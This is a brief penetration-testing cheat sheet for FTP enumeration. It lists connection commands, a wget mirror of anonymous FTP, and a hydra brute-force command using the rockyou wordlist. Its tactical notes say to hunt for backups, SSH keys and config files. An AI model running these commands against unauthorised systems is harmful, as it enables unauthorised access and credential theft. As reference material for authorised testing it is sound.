# FTP Enumeration

Goal: Identify accessible FTP services, misconfigurations, and credentials.

---

# Basic Connection

ftp <FQDN/IP>

nc -nv <FQDN/IP> 21

telnet <FQDN/IP> 21

openssl s_client -connect <FQDN/IP>:21 -starttls ftp

---

# Anonymous Access & Mirroring

wget -m --no-passive ftp://anonymous:anonymous@<target>

---

# Brute Force FTP

hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142

hydra [-l LOGIN|-L FILE] [-p PASS|-P FILE] [-C FILE] -m MODULE service://server[:PORT][/OPT]

---

# Tactical Notes

- Always try anonymous login first.
- Check write permissions.
- Mirror full FTP server if accessible.
- Look for backup files.
- Search for SSH keys and config files.
